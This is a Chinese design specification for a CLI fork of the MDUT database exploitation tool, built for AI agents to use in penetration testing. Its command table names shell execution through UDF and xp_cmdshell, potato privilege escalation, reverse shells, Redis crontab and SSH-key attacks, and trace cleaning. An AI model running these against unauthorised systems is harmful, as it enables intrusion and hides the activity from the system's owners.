## 1. 参照系：GSL5（/opt/GodzillaSuper-cli）的通用 Agent 集成模式

`GSL5` 是与本项目同构的先例（Godzilla GUI 工具 → CLI 化 fork，JDK8+Maven+shade、`--task` 隔离、JSON 信封、SKILL 手册）。其模式经实证，本项目**直接对齐**以下五件套：

| 组件 | GSL5 实现（出处） | 本项目对应 |
|---|---|---|
| ① 真实入口 wrapper | `cli/gsl5`（bash）：task 解析优先级 `--task > $GSL5_TASK > "default"`；task 语义 = chdir 到 `<tasks-root>/<task>/`；守卫：task 名拒绝 `..`、`/`，data.db 符号链接拒判（隔离破坏），NFS/CIFS 等网络 fs 拒判（WAL 不安全）；生效 task 经 `-Dgsl5.task` 传入 JVM | `cli/mdut`（§8.2）：`--task > $MDUT_TASK > default`；`-Dmdut.task`；同款守卫 + task 名正则 `[A-Za-z0-9_-]{1,64}` |
| ② 输出契约 | stdout **恰好一行 JSON**：成功 `{"ok":true,"task":...,"tool":...,"text"/业务字段}`；失败 `{"ok":false,...,"error","hint"}`；日志全走 stderr（深层杂散 println 用 FileDescriptor 手法压到 stderr）；退出码 `0` 成功 / `2` 用法错误 / `3` 目标失败 / `4` 超时 / `5` 写锁竞争 | 完全同构（§8.1）；MDUT 信封多带 `"id"`（add 返回连接 ID） |
| ③ help/能力分层 | help=快速面（L2 高频表驱动生成）；tools=发现面；**skill=编排面：「skill 不复制参数级文档」——参数靠 `--help`/`tools <name>` 实时自省，复制两份必然漂移** | 两层足够（命令面 ~30 条，无插件目录）：`mdut --help` + `mdut help <command>` 由命令表**直接生成**（表驱动即文档）；SKILL.md 只写编排知识不抄参数（§8.3） |
| ④ SKILL.md 手册 | `cli/SKILL.md`：frontmatter（name/description/whenToUse/priority/alwaysApply）+ 权威手册声明 + 何时用/怎么想 + task/退出码/大文件/代理纪律 + 长尾范式一句话 + 实验室验收引用 | `cli/SKILL.md`（§8.3，本版已出草稿） |
| ⑤ 协作纪律 | AGENTS.md：行为/CLI 词汇/构建变更必须同步 docs+SKILL.md；**新增能力必须附带可执行验收命令，无验收命令视为未完成**；每命令落审计账（`<task>/logs/operation_audit.db`），多 agent 回溯靠它 | AGENTS.md 增补同款纪律 + task 审计账（jsonl，§5.3） |

> 采纳但按 MDUT 实情裁剪：GSL5 的 `tools` 发现层与 `call` 透传（服务 ~60 工具的规模问题）本项目暂不需要；`doctor` 自检保留（java 版本/驱动 jar/Plugins 完整性/task 库健康）。

## 4. 命令面设计

### 4.1 全局约定

```bash
mdut [--task NAME] [--format json|text] [--timeout SEC] [--proxy socks5://[user:pass@]h:p]
     [-c ENC] <command> [args...]
# 等价 java -jar mdut.jar [--全局选项] <command>（wrapper 见 §8.2）

退出码：0 成功 / 2 用法错误（未知命令/缺必填/JSON 解析失败）/ 3 目标连接或执行失败 / 4 超时 / 5 task 写锁竞争
stdout：恰好一行 JSON 信封；stderr：[*] 时间戳日志（[mdut] 前缀由 wrapper 场景使用）
--help 尾部一次性展示免责声明（无 GUI 弹窗）
```

### 4.2 命令表（L2 全量，表驱动；●复用 v2.1.1 Dao｜▲资产重组｜★净新增｜◆Keep（Extend 路线））

```
连接管理
  add <type> --host H --port P [--user U] [--pass P] [--db D] [--memo M] [--group G]   # 信封带 "id"
  list [--group G] | delete <id> | add-group <name> | delete-group <name>
  task list | task path                   # task 管理（GSL5 元命令同款）
  doctor                                  # 自检：java 版本/驱动 jar/Plugins 完整性/data.db 健康/代理连通

通用操作（--id <id> 之后）
  info                                    # mysql 版本/平台/UDF 路径；mssql 版本/DBA/盘符◆环境探测；
                                          # pg 版本分档 low|udf|cve；oracle 版本/DBA；redis 版本/OS◆CVE 扫描；◆mongodb 版本/认证态
  exec <cmd>                              # mysql=shell 命令（UDF 包装 sys_eval）；
                                          # mssql --method xpcmdshell|oap|agent|clr◆|badpotato◆|godpotato◆|efspotato◆|efspotato_shellcode◆|sweetpotato◆；

  clean                                   # 各库清痕（◆mssql 含 potato 组件卸载/recovery）

文件操作
  list-files <path>   # ★mysql(sys_eval)；●mssql(xp_dirtree/CLR)；●oracle(filerun)；▲pg(pg_ls_dir)；★redis(system.exec ls)

  write <file> [--stdin|<content>]        # ●mysql(DUMPFILE)；●mssql(ADODB/CLR)；●oracle(writefile)；★pg(lo_export)；★redis(RDB)
  upload <local> <remote> / download <remote> <local> [--out 本地路径]   # ●mssql/oracle；--out 大文件直存（GSL5 大文件纪律）
  delete <path> / mkdir <path>            # ●mssql(含 CLR)/oracle；★pg/mysql(sys_eval)/redis

反弹
  revshell <ip> <port>                    # ●mysql(uwx DLL backshell)；▲pg(sys_eval bash/nc)；●oracle(shellrun connectback)；●redis(system.rev)

类型专属
  mssql : recovery（一键恢复组件）◆potato 系组件部署/卸载随 --method
  oracle: --oracle-service（服务名模式）
  redis : --vps-host/--vps-port（rogue 外部进程）；crontab/lua/sshkey [--path]；rdb --dir --file
  mongodb: info（◆Extend MongoDbDao 路线）
```

### 4.3 零配置：`JdbcProfiles`（取代 config.yaml）

```
MySQL      com.mysql.cj.jdbc.Driver | jdbc:mysql://{h}:{p}/{db}?connectTimeout={t}&socketTimeout={t}&characterEncoding=utf-8&useSSL=false&serverTimezone=UTC&rewriteBatchedStatements=true
MSSQL      net.sourceforge.jtds.jdbc.Driver | jdbc:jtds:sqlserver://{h}:{p}/{db};loginTimeout={t};socketTimeout={t}
Oracle     oracle.jdbc.driver.OracleDriver | jdbc:oracle:thin:@{h}:{p}:{db}（--oracle-service → thin:@{h}:{p}/{db}）
PostgreSQL org.postgresql.Driver | jdbc:postgresql://{h}:{p}/{db}?loginTimeout={t}&socketTimeout={t}
Redis      Jedis 原生协议；MongoDB mongodb-driver-sync 原生协议
路径：<jar目录>/Driver/*.jar、<jar目录>/Plugins/**、<jar目录>/tasks/<task>/data.db
```

默认值：超时 5s（`-t`/`--timeout` 覆盖）、编码 UTF-8（`-c`；MSSQL 直连空编码保持 GB2312 现网行为）。

### 4.4 DriverLoader（JDK 8+ 必过）

子 `URLClassLoader` 加载驱动 jar → `Class.forName(name, true, loader)` 实例化 → **直接 `driver.connect(url, props)`**（绕开 DriverManager 调用方类加载器信任检查）。附带消灭 `regroupDrivers` 排序补丁及 `"ostgresql"` 拼写 bug。`--proxy` 经 `socksProxyHost/Port/Version=5` 系统属性 + `Authenticator`（支持矩阵实测见 §6）。

## 5. task 隔离与并发

### 5.1 布局与语义（GSL5 同构）

```
<tasks-root>/<task>/            # 默认 <cwd>/tasks/<task>/；--tasks-root/$MDUT_TASKS_ROOT 可移
├── data.db                     # 首用即建（内置建表语句；WAL + busy_timeout=5000）
└── logs/audit.jsonl            # 每命令一条审计（时间/task/argv/exit/耗时）——多 agent 回溯依据
```

- 解析优先级：`--task` > `$MDUT_TASK` > `default`；wrapper chdir 进 task 目录（GSL5「task 语义 = chdir」）；task 名守卫 `[A-Za-z0-9_-]{1,64}`（拒绝 `..`、`/`、`\`）。
- **connection_id 仅 task 内唯一**；信封恒带实际生效 task 名（缺省展开为 `default`），多任务并行可核对落点。
- wrapper 守卫（照搬 GSL5）：data.db 符号链接拒判；NFS/CIFS 等 WAL 不安全 fs 拒判。

### 5.2 并发规则

| 场景 | 机制 |
|---|---|
| 多进程并发读写同一 task 库 | WAL + busy_timeout；自增 ID 安全 |
| 同一目标库并发操作 | 每进程独立连接，天然并发；`RedisDao` static 全改实例字段（M1 必修） |
| 目标侧变异互踩（UDF/CLR 部署 vs clean） | 文档声明调用方串行；冲突时退出码 5（写锁竞争）——task 级 flock 文件锁（M2 实现，GSL5 同款退出码语义） |

## 6. SOCKS5：仅入站（v3 修订）

| 方向 | 语法 | 状态 |
|---|---|---|
| 入站（经既有 SOCKS5 连目标库） | 全局 `--proxy socks5://[user:pass@]h:p` | **保留**：`socksProxyHost/Port/Version=5` 系统属性 + `Authenticator`（RFC1928 用户名/密码认证）；预期 MySQL/jTDS/Pg/Jedis 生效（java.net 栈）；**Oracle thin 需实测**，不生效则 `doctor`/错误信息给可操作提示（外部转发兜底） |
| 入站·HTTP 代理 | ~~`--proxy http://...`~~ | **不采纳**（2026-09-29 评估后回退）：JDBC 裸 socket 走 HTTP CONNECT 无原生系统属性支持，需自建本地中继改写端点，投入产出不匹配；如遇纯 HTTP 出口环境，用外部工具（如 gost/privoxy）把 http 代理转成 socks5 即可 |
| 出站枢轴（目标内网 → 本地 SOCKS5） | ~~`--id N socks5`~~ | **取消**（用户决策）。未来如需，走 deepstrike channel 系或另立项 |

## 8. 通用 Agent 集成（GSL5 五件套落地）

### 8.1 输出契约（与 GSL5 逐字同构）

- stdout 恰好一行 JSON：成功 `{"ok":true,"task":"eng1","tool":"exec","id":"12","text":"..."}`（结构化结果内联字段，尽力而为、失败回退 text）；失败 `{"ok":false,"task":"eng1","tool":"...","error":"...","hint":"可操作建议"}`。
- 日志一律 stderr；stdout 纯净化为第一纪律（深层杂散 println 经 FileDescriptor 手法压 stderr）。
- 退出码 `0/2/3/4/5`（§4.1）；CLI 侧 watcher 线程执行 `--timeout`，超时输出 exitCode=4 信封。
- 大文件纪律：`download --out` / `upload` 本地路径直存直传，禁止内容进上下文；JSON 内嵌 base64 仅限小内容。

### 8.2 `cli/mdut` wrapper（真实入口）

职责（对齐 GSL5 `cli/gsl5`）：解析并剥离 `--task/--tasks-root`（优先级 flag > `$MDUT_TASK` > default）→ task 名守卫 → `mkdir -p tasks/<task>/{logs}` → chdir → data.db 符号链接拒判 → 网络 fs 拒判 → `exec java -Dmdut.task=... -Djava.awt.headless=true -jar mdut.jar "$@"`。支持 `MDUT_JAVA`/`MDUT_JAVA_OPTS` 环境变量。

### 8.3 `cli/SKILL.md`（本版已随方案产出草稿，位于仓库 `cli/SKILL.md`）

结构对齐 GSL5：frontmatter（name: `pentest-mdut` / description / whenToUse / priority / alwaysApply）→ 权威手册声明（**skill 不复制参数级文档**，语法以 `mdut --help`、参数以 `mdut help <command>` 实时输出为准）→ 何时用/怎么想（拿凭据后怎么选库选路）→ 语法与约定（一行 JSON/退出码/task/超时）→ L2 高频命令样例 → 长尾范式（`help <command>` 自省）→ 纪律（大文件/代理/审计/task 卫生/编码/清痕义务）→ 实验室验收引用。

### 8.4 同步与验收纪律（已落地：[AGENTS.md](../AGENTS.md)）

- **实验室验收用例（TC1–TC4）已固化在 [AGENTS.md §4.1](../AGENTS.md)**：TC1 本机 Redis（mirrorstrike 实例，非破坏）、TC2 本机 PostgreSQL（mirrorstrike 实例，只读为主）、TC3 MySQL+UDF 全链（docker 可弃容器，`--secure-file-priv=` 关键参数）、TC4 SOCKS5 入站代理+内网 MySQL（192.168.52/172.31 拓扑，含直连负控制）。

- 行为/命令词汇/构建流程变更，必须同步：实施规格文档 + `cli/SKILL.md`（GSL5 同款规则）。
- **新增能力必须附带可执行验收命令**写入 docs/ 或 SKILL.md；无验收命令的功能视为未完成。
- 每命令自动落 `logs/audit.jsonl`；禁止绕过；task 卫生：凭据不进 skill/文档，任务结束清理并在任务记录留痕。

## 11. deepstrike 迁移指南（交接物；**插件适配暂缓，另行立项**）

> 通用 SKILL 集成已覆盖「任何 agent 直接用 CLI」的路径；deepstrike 若未来将 `db_exploit` 切到新 CLI，参考以下判据（细节以届时《迁移指南》落地版为准）：
